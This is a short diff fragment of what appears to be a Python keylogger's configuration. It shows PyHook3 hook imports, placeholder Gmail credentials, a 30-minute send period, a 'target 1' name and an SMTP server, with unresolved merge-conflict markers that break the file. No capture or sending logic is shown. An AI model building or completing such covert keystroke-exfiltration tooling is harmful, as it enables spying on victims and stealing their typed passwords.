@@ -9,7 +9,11 @@ from threading import Timer
 from PyHook3 import HookManager
 
 TO_EMAIL = 'youremail@gmail.com'
+<<<<<<< HEAD
 PS_EMAIL = 'youremail'
+=======
+PS_EMAIL = 'yourpassword'
+>>>>>>> 33a1e70b280e052ed0d52df1b4a3cf25a81129cc
 PERIOD = 1800.0 #seconds
 TARGET_NAME = 'target 1'
 SVR_MAIL = 'smtp.gmail.com:587'
